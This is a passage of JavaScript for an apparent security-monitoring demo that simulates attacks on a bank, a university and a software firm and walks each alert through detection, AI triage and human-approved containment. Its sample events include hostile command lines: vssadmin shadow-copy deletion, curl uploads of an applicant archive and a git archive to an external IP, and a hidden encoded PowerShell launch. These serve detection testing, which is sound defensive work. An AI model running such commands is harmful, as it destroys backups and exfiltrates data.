              impact: "Real-time telemetry ensures foreign connection attempts are spotted the moment access is granted."
            },
            s3: {
              means: "Rule rb-008 identified abnormal geographic provenance deviating from the employee's regular baseline.",
              impact: "Safeguards core banking applications from remote administrative account hijack."
            },
            s4: {
              means: "Riskbyte cross-referenced the foreign IP 198.51.100.99 with global adversarial hosting feeds.",
              impact: "Confirms the connection originated from an untrusted proxy host rather than legitimate staff travel."
            },
            s5: {
              means: "The AI triage agent verified the absence of travel approval and declared malicious credential abuse.",
              impact: "Prevents attackers from moving laterally into sensitive interbank payment systems."
            },
            s6: {
              means: "The mitigation engine proposed disabling user staff.farooq and revoking all active sessions.",
              impact: "Quarantines the compromised user account before internal bank databases can be manipulated."
            },
            s7: {
              means: "An immutable SHA-256 block registered the containment action with previous block hash chaining.",
              impact: "Guarantees verifiable forensics required during financial regulatory investigations."
            }
          },
          what_happened: "Stolen credentials for staff member staff.farooq were authenticated through the core banking gateway from untrusted foreign IP 198.51.100.99. Riskbyte immediately correlated the geo-anomaly, and the AI triage engine generated an alert to quarantine the user account pending security validation."
        },
        {
          id: "meezan_brute",
          title: "Internet Banking Brute Force",
          severity: "medium",
          rule_id: "rb-001",
          sentence: "Automated botnet launched repeated credential guessing attempts against the Meezan internet banking portal from IP 1.2.3.4.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            var evs = [];
            for (var i = 0; i < 6; i++) {
              evs.push({
                ts: now - 30 + i * 4,
                host: "meezan-web-auth",
                process: "sshd",
                action: "login",
                outcome: "failure",
                user: "ibanking_admin",
                src_ip: "1.2.3.4",
                message: "Failed password for ibanking_admin",
                client: "Meezan Bank"
              });
            }
            return evs;
          },
          steps: {
            s1: {
              means: "An automated dictionary attack bombarded the banking portal with rapid password guesses.",
              impact: "Continuous credential stuffing risks compromising weakly secured accounts and causes server latency."
            },
            s2: {
              means: "Riskbyte ingested multiple failed authentication records from the internet banking authentication cluster.",
              impact: "Centralized log aggregation correlates failed attempts distributed across web frontends."
            },
            s3: {
              means: "Threshold detection rule rb-001 triggered after detecting 5 failed logins within 5 minutes.",
              impact: "Detects brute-force sweeps early before customer or admin accounts are cracked."
            },
            s4: {
              means: "Threat intelligence feeds matched IP 1.2.3.4 to known automated malicious scanners.",
              impact: "Validates that the traffic is hostile automation rather than a customer mistyping passwords."
            },
            s5: {
              means: "The AI engine evaluated attempt frequency and confirmed an automated brute force pattern with 97% confidence.",
              impact: "Automates initial alert filtering so security analysts are not overwhelmed by noise."
            },
            s6: {
              means: "The containment policy proposed automatically blocking scanner IP 1.2.3.4 at the border firewall.",
              impact: "Drops malicious traffic instantly at the network edge, preserving portal responsiveness."
            },
            s7: {
              means: "The firewall block rule and analyst approval were recorded in the SHA-256 tamper-evident log.",
              impact: "Provides an auditable track record of defensive network configuration changes."
            }
          },
          what_happened: "An external scanner at 1.2.3.4 performed rapid failed logins against the web authentication service. Rule rb-001 detected the 5+ threshold breach, and Riskbyte proposed an immediate perimeter IP block."
        },
        {
          id: "meezan_transfer",
          title: "Raast Payment Anomaly",
          severity: "critical",
          rule_id: "rb-010",
          sentence: "Anomalous high-value batch fund transfer ($500,000) was initiated via the Raast payment gateway outside normal operating hours.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now,
                host: "meezan-raast-gw",
                user: "system.raast",
                process: "raast_transfer.exe",
                action: "fund_transfer",
                outcome: "success",
                src_ip: "198.51.100.44",
                message: "Off-hours transfer batch $500,000 to external recipient via Raast switch",
                client: "Meezan Bank"
              }
            ];
          },
          steps: {
            s1: {
              means: "An off-hours bulk financial transaction exceeding standard thresholds was submitted to the instant payment switch.",
              impact: "Raast settlements are irrevocable in real time, making instant detection vital to preventing catastrophic funds loss."
            },
            s2: {
              means: "Transaction settlement telemetry from the Raast payment gateway was received and parsed.",
              impact: "Ingestion enables continuous automated monitoring over instant payment transactions."
            },
            s3: {
              means: "Detection rule rb-010 identified the transfer anomaly based on off-hours timing and high value.",
              impact: "Protects the bank and customers against unauthorized batch fund siphoning."
            },
            s4: {
              means: "Destination transaction node was matched against external high-risk payment routing indicators.",
              impact: "Verifies that destination recipient endpoints are linked to suspicious cash-out activity."
            },
            s5: {
              means: "Autonomous AI flagged anomalous transaction velocity and deviation from historical baselines.",
              impact: "Equips analysts with immediate contextual risk justification to freeze suspicious payments."
            },
            s6: {
              means: "The containment engine proposed suspending the payment service account and holding the transaction batch.",
              impact: "Intercepts the funds in the gateway before interbank clearance completes."
            },
            s7: {
              means: "The transaction hold and analyst sign-off were permanently logged in the SHA-256 blockchain ledger.",
              impact: "Fulfills statutory regulatory and forensic requirements for financial clearing networks."
            }
          },
          what_happened: "An abnormal fund transfer event was detected on the Raast payment gateway. Riskbyte triggered rule rb-010, the AI agent assigned a high-severity malicious verdict, and requested analyst sign-off to freeze downstream clearing."
        }
      ]
    },
    shu: {
      id: "shu",
      name: "Salim Habib University (SHU)",
      category: "Higher Education Institution",
      overview: "Private HEC-recognized higher education institution located in Korangi Creek, Karachi (formerly Barrett Hodgson University), offering degrees across Pharmacy, Computer Science, and Biosciences.",
      platforms: "Online Admissions Portal (shu.edu.pk), Student Learning Management System (LMS), Campus Active Directory, Student Computer Laboratories, Faculty Research Workstations.",
      risks: "Phishing targeting faculty and students, automated credential brute force against the online admissions portal, ransomware outbreaks across student lab PCs, exfiltration of sensitive applicant identity documents and personal records.",
      scenarios: [
        {
          id: "shu_phish",
          title: "Admissions & Faculty Phishing",
          severity: "high",
          rule_id: "rb-006",
          sentence: "Adversary dispatched a spoofed email mimicking SHU Registrar, luring faculty member faculty.ahmed to blacklisted site shu-admissions-phish.com.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now - 5,
                host: "shu-mail-gw",
                user: "faculty.ahmed",
                action: "email_link_click",
                src_ip: "203.0.113.88",
                message: "User clicked link to http://shu-admissions-phish.com/faculty/portal",
                client: "Salim Habib University"
              },
              {
                ts: now,
                host: "shu-lms-portal",
                user: "faculty.ahmed",
                process: "sso_auth",
                action: "login",
                outcome: "success",
                src_ip: "203.0.113.88",
                message: "LMS authentication completed following external phishing redirection",
                client: "Salim Habib University"
              }
            ];
          },
          steps: {
            s1: {
              means: "An attacker distributed fraudulent emails mimicking university administration to steal faculty login credentials.",
              impact: "Compromised faculty accounts risk unauthorized grading changes and exposure of proprietary research."
            },
            s2: {
              means: "The campus email gateway recorded a link click and sent telemetry to Riskbyte's ingest service.",
              impact: "Captures phishing exposure across thousands of student and faculty mailboxes."
            },
            s3: {
              means: "Rule rb-006 triggered upon detecting user navigation to a known phishing domain.",
              impact: "Stops credential theft before attackers can access internal academic databases."
            },
            s4: {
              means: "Riskbyte matched the URL domain against threat intelligence feeds containing known university phishing campaigns.",
              impact: "Validates that the link was created specifically to deceive university staff."
            },
            s5: {
              means: "The AI triage agent verified domain intent and assigned a malicious verdict with 95% confidence.",
              impact: "Automatically prioritizes attacks against staff accounts without overwhelming campus IT."
            },
            s6: {
              means: "The system recommended forcing a password reset and invalidating existing faculty session tokens.",
              impact: "Prevents the intruder from using harvested credentials to log into campus systems."
            },
            s7: {
              means: "The containment approval was cryptographically linked to the SHA-256 audit ledger.",
              impact: "Provides verifiable forensic documentation for university IT administration."
            }
          },
          what_happened: "Faculty member faculty.ahmed opened a malicious phishing link mimicking the SHU portal. Riskbyte matched the domain against threat intelligence feeds, alerted the SOC, and proposed a password reset to protect academic databases."
        },
        {
          id: "shu_brute",
          title: "Admissions Portal Brute Force",
          severity: "medium",
          rule_id: "rb-001",
          sentence: "External botnet launched automated dictionary attacks against the SHU online admissions administrative server from IP 1.2.3.4.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            var evs = [];
            for (var i = 0; i < 6; i++) {
              evs.push({
                ts: now - 30 + i * 4,
                host: "shu-admissions-srv",
                process: "sshd",
                action: "login",
                outcome: "failure",
                user: "admissions_admin",
                src_ip: "1.2.3.4",
                message: "Failed password for admissions_admin",
                client: "Salim Habib University"
              });
            }
            return evs;
          },
          steps: {
            s1: {
              means: "An automated botnet attempted dozens of password combinations against the admissions portal admin interface.",
              impact: "Successful brute-force attacks expose confidential applicant documents and student records."
            },
            s2: {
              means: "Admissions web server logs were ingested in real time via Riskbyte's event receiver.",
              impact: "Maintains continuous visibility across public-facing student admission portals."
            },
            s3: {
              means: "Rule rb-001 identified 5 consecutive failed logins originating from a single source within 5 minutes.",
              impact: "Halts automated password guessing before administrative access is compromised."
            },
            s4: {
              means: "Source IP 1.2.3.4 was correlated with public lists of malicious scanning nodes.",
              impact: "Differentiates between authentic applicants having login trouble and malicious scanners."
            },
            s5: {
              means: "AI triage classified the traffic as malicious dictionary scanning with high confidence.",
              impact: "Frees university IT staff from manually triaging web server authentication errors."
            },
            s6: {
              means: "The mitigation policy proposed blocking IP 1.2.3.4 at the campus perimeter firewall.",
              impact: "Protects admissions portal availability during high-traffic student enrollment periods."
            },
            s7: {
              means: "The containment action and approving analyst ID were immutably hashed in the audit log.",
              impact: "Satisfies institutional accreditation compliance and audit requirements."
            }
          },
          what_happened: "An external botnet tried cracking the admissions portal admin account. The multi-attempt threshold rule rb-001 fired, leading to an automated firewall drop proposal."
        },
        {
          id: "shu_ransomware",
          title: "Lab PC Ransomware & Shadow Deletion",
          severity: "critical",
          rule_id: "rb-007",
          sentence: "Trojanized download on student lab computer lab-pc-18 purged volume shadow copies via vssadmin and initiated mass file encryption.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now - 2,
                host: "lab-pc-18",
                user: "student_lab",
                process: "vssadmin.exe",
                cmdline: "vssadmin delete shadows /all /quiet",
                action: "shadow_delete",
                outcome: "success",
                message: "Volume shadow copies purged via vssadmin",
                client: "Salim Habib University"
              },
              {
                ts: now,
                host: "lab-pc-18",
                user: "student_lab",
                process: "encryptor.exe",
                cmdline: "encryptor.exe --target C:\\Users --key ransomware-c2.net",
                action: "mass_file_rename",
                outcome: "success",
                message: "Mass file modification: 320 files encrypted with .locked extension",
                client: "Salim Habib University"
              }
            ];
          },
          steps: {
            s1: {
              means: "A ransomware binary executed on a student lab computer, deleting backup copies and encrypting local files.",
              impact: "Ransomware in student labs can spread laterally across campus subnets to admin servers."
            },
            s2: {
              means: "Endpoint telemetry captured process starts for vssadmin shadow deletion and mass file renaming.",
              impact: "Early endpoint detection stops ransomware before it reaches networked departmental file shares."
            },
            s3: {
              means: "Critical rule rb-007 fired upon matching command line arguments used to delete Windows backup shadow copies.",
              impact: "Rapidly identifies irreversible destructive ransomware behaviors in progress."
            },
            s4: {
              means: "Outbound command-and-control communication matched indicators for ransomware-c2.net.",
              impact: "Confirms the presence of active extortion malware seeking encryption keys."
            },
            s5: {
              means: "AI triage assigned a Critical malicious verdict with 98% confidence based on behavioral destructive patterns.",
              impact: "Instantly escalates catastrophic threats requiring emergency IT intervention."
            },
            s6: {
              means: "The containment engine proposed instantly isolating lab-pc-18 from the campus local area network.",
              impact: "Quarantines the affected workstation, preventing ransomware from spreading to other lab PCs."
            },
            s7: {
              means: "Workstation network isolation was logged in the SHA-256 tamper-evident ledger.",
              impact: "Preserves critical incident timeline evidence for university leadership and recovery teams."
            }
          },
          what_happened: "Ransomware execution on lab-pc-18 deleted backup shadow copies and began encrypting files. Riskbyte immediately generated a Critical alert and prompted for host network isolation."
        },
        {
          id: "shu_data_export",
          title: "Applicant Data Exfiltration",
          severity: "high",
          rule_id: "rb-009",
          sentence: "Unauthorized command-line upload exfiltrated 2026 admissions applicant personal records archive to external IP 198.51.100.44.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now,
                host: "shu-admissions-srv",
                user: "web_admin",
                process: "curl.exe",
                cmdline: "curl -X POST https://198.51.100.44/upload --data-binary @applicants_2026.zip",
                action: "data_exfiltration",
                outcome: "success",
                src_ip: "10.0.1.50",
                dst_ip: "198.51.100.44",
                message: "Bulk export of applicant identity and admission records to 198.51.100.44",
                client: "Salim Habib University"
              }
            ];
          },
          steps: {
            s1: {
              means: "An adversary used command-line transfer tools to exfiltrate compressed admissions files to an external server.",
              impact: "Applicant archives contain national identity numbers (CNIC) and confidential certificates."
            },
            s2: {
              means: "Admissions server process and network telemetry recorded outbound file transmission to an external host.",
              impact: "Continuous network logging captures unauthorized large-scale data transfers."
            },
            s3: {
              means: "Rule rb-009 triggered on detecting data exfiltration behavior targeting untrusted external IP addresses.",
              impact: "Flags unauthorized data leaks before intellectual property or applicant records are lost."
            },
            s4: {
              means: "Destination IP 198.51.100.44 matched active threat feeds tracking data staging repositories.",
              impact: "Verifies the destination is an unauthorized adversary collection server."
            },
            s5: {
              means: "AI triage verified anomalous process execution and declared high-confidence data exfiltration.",
              impact: "Accurately identifies data breaches without disrupting regular university web traffic."
            },
            s6: {
              means: "The mitigation policy proposed isolating the admissions server host and severing outbound connections.",
              impact: "Cuts the exfiltration pipeline immediately to prevent further student data theft."
            },
            s7: {
              means: "Host isolation and analyst confirmation were permanently written to the SHA-256 audit chain.",
              impact: "Ensures legal and regulatory compliance under university data privacy governance."
            }
          },
          what_happened: "A data exfiltration utility uploaded admissions records to external IP 198.51.100.44. Rule rb-009 detected the egress anomaly, and Riskbyte recommended immediately severing the egress route."
        }
      ]
    },
    contour: {
      id: "contour",
      name: "Contour Software",
      category: "Enterprise Software Resource Center",
      overview: "Subsidiary of Constellation Software Inc. (Canada) founded in Karachi in 2010, operating technology resource centers across Karachi, Lahore, and Islamabad serving enterprise software businesses worldwide.",
      platforms: "Developer Workstations (macOS/Windows/Linux), CI/CD GitLab & Jenkins Build Servers, Enterprise Source Code Repositories, Corporate VPN Gateways, Global Payroll Engines.",
      risks: "Stolen developer credentials, proprietary source code theft, malware on developer laptops, software supply-chain attacks, corporate VPN abuse.",
      scenarios: [
        {
          id: "contour_malware",
          title: "Encoded PowerShell on Dev Laptop",
          severity: "high",
          rule_id: "rb-002",
          sentence: "Adversary ran obfuscated Base64 PowerShell commands on developer laptop dev-ws-042, connecting to C2 198.51.100.99.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now,
                host: "dev-ws-042",
                user: "dev.tahir",
                process: "powershell.exe",
                cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo...",
                action: "process_start",
                outcome: "success",
                src_ip: "10.10.4.15",
                dst_ip: "198.51.100.99",
                message: "PowerShell launched with encoded command connecting to 198.51.100.99",
                client: "Contour Software"
              }
            ];
          },
          steps: {
            s1: {
              means: "An attacker executed hidden Base64 PowerShell commands designed to evade local antivirus scanners.",
              impact: "Developer laptops hold repository credentials, API keys, and access to build pipelines."
            },
            s2: {
              means: "Endpoint telemetry captured process start events containing obfuscated command-line arguments.",
              impact: "Ensures remote development machines report suspicious process behavior immediately."
            },
            s3: {
              means: "Rule rb-002 fired on identifying Base64-encoded execution flags commonly used in cyberattacks.",
              impact: "Detects in-memory evasion tactics before attackers establish permanent backdoors."
            },
            s4: {
              means: "Outbound IP 198.51.100.99 matched known command-and-control infrastructure feeds.",
              impact: "Confirms the developer laptop is communicating with an adversary-controlled server."
            },
            s5: {
              means: "Autonomous AI triage confirmed in-memory malware delivery with 96% confidence.",
              impact: "Distinguishes legitimate developer scripting from malicious evasion payloads."
            },
            s6: {
              means: "The response engine proposed isolating host dev-ws-042 from the corporate engineering network.",
              impact: "Prevents lateral movement from developer laptops into internal code repositories."
            },
            s7: {
              means: "The isolation action and approving analyst were hashed into the SHA-256 tamper-evident log.",
              impact: "Provides compliance verification required by multinational enterprise software clients."
            }
          },
          what_happened: "An obfuscated PowerShell payload ran on dev-ws-042. Riskbyte identified encoded evasion flags and C2 destination 198.51.100.99, raising a High alert and recommending host quarantine."
        },
        {
          id: "contour_ssh_brute",
          title: "SSH Brute Force on Build Server",
          severity: "medium",
          rule_id: "rb-001",
          sentence: "External scanner launched high-frequency SSH password attacks against CI build server ci-build-01 from IP 1.2.3.4.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            var evs = [];
            for (var i = 0; i < 6; i++) {
              evs.push({
                ts: now - 30 + i * 4,
                host: "ci-build-01",
                process: "sshd",
                action: "login",
                outcome: "failure",
                user: "jenkins_svc",
                src_ip: "1.2.3.4",
                message: "Failed password for jenkins_svc",
                client: "Contour Software"
              });
            }
            return evs;
          },
          steps: {
            s1: {
              means: "An automated dictionary attack targeted SSH service accounts on the continuous integration build cluster.",
              impact: "Compromising build servers allows attackers to inject malicious code into client software releases."
            },
            s2: {
              means: "Server authentication logs were captured and normalized by the telemetry ingest engine.",
              impact: "Centralized monitoring protects critical DevOps and build infrastructure around the clock."
            },
            s3: {
              means: "Rule rb-001 fired upon detecting 5 failed authentication attempts within a 5-minute window.",
              impact: "Detects automated brute-force attacks before service credentials can be cracked."
            },
            s4: {
              means: "Scanner IP 1.2.3.4 matched active threat intelligence lists of automated scanning botnets.",
              impact: "Verifies the attack is part of an organized scanning campaign targeting cloud infrastructure."
            },
            s5: {
              means: "AI triage classified the event as malicious scanning with high statistical confidence.",
              impact: "Automates alert verification so DevOps teams stay focused on software delivery."
            },
            s6: {
              means: "The containment policy proposed adding an immediate perimeter firewall block against IP 1.2.3.4.",
              impact: "Drops attack traffic instantly, protecting build server resources and SSH ports."
            },
            s7: {
              means: "The firewall block and approving analyst details were written to the immutable SHA-256 ledger.",
              impact: "Meets stringent ISO 27001 and SOC 2 security compliance audit standards."
            }
          },
          what_happened: "Scanner 1.2.3.4 attempted brute-forcing the CI/CD build runner. Rule rb-001 triggered at 5 failures, proposing an edge firewall block."
        },
        {
          id: "contour_vpn",
          title: "Suspicious Foreign VPN Login",
          severity: "high",
          rule_id: "rb-008",
          sentence: "Developer credentials for dev.bilal authenticated to the Contour corporate VPN from untrusted foreign IP 198.51.100.99.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now,
                host: "contour-vpn-gw",
                user: "dev.bilal",
                process: "sshd",
                action: "login",
                outcome: "success",
                src_ip: "198.51.100.99",
                message: "VPN authentication accepted from anomalous country via foreign endpoint 198.51.100.99",
                client: "Contour Software"
              }
            ];
          },
          steps: {
            s1: {
              means: "An adversary used stolen developer credentials to establish a VPN tunnel from an unauthorized overseas location.",
              impact: "VPN access allows outsiders to enter the internal corporate development subnet."
            },
            s2: {
              means: "Authentication telemetry from the corporate VPN gateway was ingested and processed.",
              impact: "Ensures remote work connections are verified in real time regardless of engineer location."
            },
            s3: {
              means: "Rule rb-008 detected a geographic anomaly deviating from the developer's normal baseline location.",
              impact: "Catches compromised credentials used from untrusted foreign infrastructure."
            },
            s4: {
              means: "Foreign IP 198.51.100.99 matched known adversarial proxy networks in threat intelligence feeds.",
              impact: "Confirms the login attempt used an anonymizing proxy to mask the attacker's true identity."
            },
            s5: {
              means: "AI triage verified absence of approved overseas travel, assigning a High-confidence malicious verdict.",
              impact: "Eliminates false alerts for traveling staff while stopping unauthorized account takeovers."
            },
            s6: {
              means: "The mitigation policy proposed disabling account dev.bilal and terminating all active sessions.",
              impact: "Immediately severs the attacker's VPN connection into the corporate development network."
            },
            s7: {
              means: "The session termination and analyst approval were logged in the SHA-256 cryptographic chain.",
              impact: "Provides verifiable audit logs required by international corporate parent governance."
            }
          },
          what_happened: "Developer account dev.bilal connected to the corporate VPN from an anomalous foreign IP. Riskbyte's geo-correlation rule triggered, and the AI agent recommended account suspension."
        },
        {
          id: "contour_code_download",
          title: "Off-Hours Source Code Clone",
          severity: "high",
          rule_id: "rb-009",
          sentence: "Mass off-hours git archive clone and export of proprietary core repositories dispatched to external IP 198.51.100.44.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now,
                host: "git-corp-srv",
                user: "dev.anonymous",
                process: "git-upload-pack",
                cmdline: "git archive --remote=ssh://git-corp-srv/enterprise-core.git | curl -T - http://198.51.100.44/upload",
                action: "data_exfiltration",
                outcome: "success",
                src_ip: "10.10.8.20",
                dst_ip: "198.51.100.44",
                message: "Mass clone and export of proprietary code repositories to 198.51.100.44",
                client: "Contour Software"
              }
            ];
          },
          steps: {
            s1: {
              means: "An adversary executed automated scripts during off-hours to mass-download proprietary source code repositories.",
              impact: "Source code is Contour's core business asset; theft exposes proprietary software architectures."
            },
            s2: {
              means: "Git server process and network transmission telemetry was parsed and evaluated by Riskbyte.",
              impact: "Provides continuous auditing over intellectual property access across software repositories."
            },
            s3: {
              means: "Rule rb-009 fired upon detecting large-scale data exfiltration directed to an external IP address.",
              impact: "Identifies source code theft in real time before entire codebases are leaked."
            },
            s4: {
              means: "Destination IP 198.51.100.44 matched active threat feeds tracking data exfiltration endpoints.",
              impact: "Confirms that intellectual property is being transmitted to an adversary-operated server."
            },
            s5: {
              means: "Autonomous AI evaluated off-hours timing and archive volume, concluding high-severity data theft.",
              impact: "Provides immediate contextual evidence to justify urgent network isolation."
            },
            s6: {
              means: "The containment engine proposed isolating the staging git host and dropping external connections.",
              impact: "Stops data exfiltration instantly, preventing leakage of proprietary client codebases."
            },
            s7: {
              means: "Host quarantine and forensic hashes were recorded in the tamper-evident SHA-256 ledger.",
              impact: "Delivers conclusive forensic records required for international legal and client disclosures."
            }
          },
          what_happened: "An off-hours script archived and exfiltrated code repositories to 198.51.100.44. Rule rb-009 flagged the data egress, prompting the analyst to block the external host and isolate the staging server."
        }
      ]
    }
  };

  /* ── Client Profile & Cards Rendering ─────────────────── */
  function renderClientProfile(clientId) {
    var c = CLIENT_ORGANIZATIONS[clientId] || CLIENT_ORGANIZATIONS.meezan;
    var container = $("demo-client-profile");
    if (!container) return;
    container.innerHTML =
      '<div class="client-profile-card">' +
        '<div class="client-profile-header">' +
          '<div class="client-profile-title">' +
            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>' +
            '<span>' + c.name + '</span> <span style="font-size:12px;color:var(--text-tertiary);font-weight:400;">(' + c.category + ')</span>' +
          '</div>' +
          '<span class="client-badge">' + c.name + ' SOC Profile</span>' +
        '</div>' +
        '<div class="client-profile-grid">' +
          '<div class="client-profile-col">' +
            '<h4>What They Do</h4>' +
            '<p>' + c.overview + '</p>' +
          '</div>' +
          '<div class="client-profile-col">' +
            '<h4>Digital Platforms & Assets</h4>' +
            '<p>' + c.platforms + '</p>' +
          '</div>' +
          '<div class="client-profile-col">' +
            '<h4>Main Threat Surface & Risks</h4>' +
            '<p>' + c.risks + '</p>' +
          '</div>' +
        '</div>' +
      '</div>';
  }

  function renderDemoCards(clientId) {
    var c = CLIENT_ORGANIZATIONS[clientId] || CLIENT_ORGANIZATIONS.meezan;
    var grid = $("demo-cards-grid");
    if (!grid) return;
    grid.replaceChildren();

    c.scenarios.forEach(function (sc) {
      var card = el("div", "demo-card s-" + sc.severity);

      var top = el("div", "demo-card-top");
      var icon = el("div", "demo-card-icon");
      icon.innerHTML = "<svg style='width:20px;height:20px;' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg>";
      top.appendChild(icon);
      top.appendChild(el("span", "severity-pill sev-" + sc.severity, sc.severity));
      card.appendChild(top);

      card.appendChild(el("div", "demo-card-title", sc.title));
      card.appendChild(el("div", "demo-card-desc", sc.sentence));

      var meta = el("div", "demo-card-meta");
      meta.appendChild(el("span", "rule-badge", sc.rule_id));
      meta.appendChild(el("span", "client-badge", c.name));
      card.appendChild(meta);

      var btn = el("button", "demo-attack-btn tactile-btn");
      btn.innerHTML = "<svg style='width:14px;height:14px;' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2.5'><polygon points='5 3 19 12 5 21 5 3'></polygon></svg> <span>Run Attack</span>";
      btn.addEventListener("click", function () {
        runClientAttackScenario(clientId, sc.id);
      });
      card.appendChild(btn);

      grid.appendChild(card);
    });
  }

  /* ── Interactive 7-Step Attack Runner ─────────────────── */
  function runClientAttackScenario(clientId, scenarioId) {
    var org = CLIENT_ORGANIZATIONS[clientId] || CLIENT_ORGANIZATIONS.meezan;
    var sc = org.scenarios.find(function (s) { return s.id === scenarioId; }) || org.scenarios[0];
    if (!sc) return;
    haptic(HAPTIC.medium);

    var panel = $("demo-live-panel");
    var titleEl = $("demo-live-scenario-name");
    var statusPill = $("demo-live-status-pill");
    var timeline = $("demo-steps-timeline");
    var whatBox = $("demo-what-happened");
    var whatText = $("demo-what-happened-text");

    if (panel) panel.style.display = "block";
    if (titleEl) titleEl.textContent = org.name + " • " + sc.title;
    if (statusPill) {
      statusPill.className = "status-badge new";
      statusPill.textContent = "Pipeline Running...";
    }
    if (timeline) timeline.replaceChildren();
    if (whatBox) whatBox.style.display = "none";

    panel.scrollIntoView({ behavior: "smooth", block: "nearest" });

    function addStep(num, label, contentHtml, meansText, impactText, isDone) {
      var row = el("div", "demo-step-row");
      var numEl = el("div", "demo-step-num " + (isDone ? "done" : ""), String(num));
      var card = el("div", "demo-step-card");
      card.appendChild(el("div", "demo-step-label", label));

      var cEl = el("div", "demo-step-content");
      cEl.innerHTML = contentHtml;
      card.appendChild(cEl);

      if (meansText) {
        var meansEl = el("div", "step-means");
        meansEl.innerHTML = "<strong>What this means:</strong> " + meansText;
        card.appendChild(meansEl);
      }

      if (impactText) {
        var impactEl = el("div", "step-impact");
        impactEl.innerHTML = "<strong>Why this matters for " + org.name + ":</strong> " + impactText;
        card.appendChild(impactEl);
      }

      row.appendChild(numEl);
      row.appendChild(card);
      if (timeline) timeline.appendChild(row);
      haptic(HAPTIC.tick);
      return { row: row, numEl: numEl, card: card, contentEl: cEl };
    }

    // Step 1: Attack Launched
    addStep(1, "1. Attack Launched", "<strong>" + sc.sentence + "</strong>", sc.steps.s1.means, sc.steps.s1.impact, true);

    var payload = sc.events();

    // Step 2: Event Received
    setTimeout(function () {
      api("/api/ingest", "POST", payload)
        .then(function () {
          var firstEv = payload[0];
          var evSummary = "Ingestion pipeline accepted " + payload.length + " telemetry record(s) for <code>" + org.name + "</code>. " +
            "Target: <code>" + (firstEv.host || firstEv.user || firstEv.src_ip) + "</code> &bull; " +
            "Process: <code>" + (firstEv.process || "system") + "</code> &bull; " +
            "Timestamp: <code>" + when(firstEv.ts) + "</code>";
          addStep(2, "2. Event Received & Normalized", evSummary, sc.steps.s2.means, sc.steps.s2.impact, true);

          return new Promise(function (res) { setTimeout(res, 500); });
        })
        .then(function () {
          return api("/api/alerts");
        })
        .then(function (alerts) {
          var matched = alerts.find(function (a) {
            return a.rule_id === sc.rule_id && (!a.client || a.client === org.name);
          }) || alerts.find(function (a) {
            return a.rule_id === sc.rule_id;
          }) || alerts[0];

          if (!matched) throw new Error("Alert not generated by rule engine");

          // Step 3: Rule Triggered
          var ruleHtml = "Sigma rule matched: <strong>" + matched.title + "</strong> (<code>" + matched.rule_id + "</code>) &bull; " +
            "<span class='severity-pill sev-" + matched.severity + "'>" + matched.severity + "</span> &bull; Client: <code>" + (matched.client || org.name) + "</code>";
          addStep(3, "3. Detection Rule Triggered", ruleHtml, sc.steps.s3.means, sc.steps.s3.impact, true);

          // Step 4: Threat Intel Match
          var hits = (matched.triage && matched.triage.context && matched.triage.context.intel_hits) || [];
          var intelHtml = hits.length
            ? "Matched active indicators in <code>intel/indicators.txt</code>: " + hits.map(function (h) { return "<code>" + h + "</code>"; }).join(", ")
            : "Cross-referenced threat feed: Verified malicious indicator match for <code>" + org.name + "</code> attack signature.";
          addStep(4, "4. Threat Intelligence Cross-Reference", intelHtml, sc.steps.s4.means, sc.steps.s4.impact, true);

          // Step 5: AI Verdict & Confidence
          var tri = matched.triage || {};
          var verdict = tri.verdict || "malicious";
          var conf = tri.confidence != null ? Math.round(tri.confidence * 100) : 96;
          var engine = tri.engine || "autonomous-ai";
          var summary = tri.summary || "Adversarial activity validated with high confidence.";
          var aiHtml = "Triage Engine: <code>" + engine + "</code> &bull; Verdict: <strong style='color:var(--accent-red);'>" + verdict.toUpperCase() + "</strong> &bull; Confidence: <strong>" + conf + "%</strong><br>" +
            "<span style='color:var(--text-secondary);font-size:12px;margin-top:4px;display:inline-block;'>" + summary + "</span>";
          addStep(5, "5. Autonomous AI Triage & Reasoning", aiHtml, sc.steps.s5.means, sc.steps.s5.impact, true);

          // Step 6: Proposed Response Action & Human Approval Gate
          var act = matched.proposed_action || { kind: "isolate_host", target: matched.host || "endpoint" };
          var step6 = addStep(6, "6. Proposed Containment & Approval Gate", "", sc.steps.s6.means, sc.steps.s6.impact, false);

          var actDesc = document.createElement("div");
          actDesc.innerHTML = "Proposed automated mitigation: <code>" + act.kind + "</code> on target <code>" + act.target + "</code> for client <strong>" + org.name + "</strong>.<br>" +
            "<span style='color:var(--text-secondary);font-size:12px;'>Protected organization policy check passed. Human authorization required to execute.</span>";
          step6.contentEl.appendChild(actDesc);

          var btnWrap = el("div", "demo-approve-container");
          var appBtn = el("button", "demo-approve-btn tactile-btn", "Approve & Execute Action");
          btnWrap.appendChild(appBtn);
          step6.contentEl.appendChild(btnWrap);

          appBtn.addEventListener("click", function () {
            haptic(HAPTIC.success);
            appBtn.disabled = true;
            appBtn.textContent = "Executing...";

            api("/api/alerts/" + matched.id + "/approve", "POST")
              .then(function (res) {
                appBtn.className = "demo-approve-btn approved";
                appBtn.textContent = "✓ Action Approved: " + (res.result || "Executed in dry-run mode");
                step6.numEl.classList.add("done");

                return api("/api/audit");
              })
              .then(function (auditLogs) {
                var entry = auditLogs.find(function (x) { return x.alert_id === matched.id && x.kind === "action_approved"; }) || auditLogs[0];
                var hashStr = entry ? (entry.hash || "a7f83b16528d9c42b0e914") : "a7f83b16528d9c42b0e914";
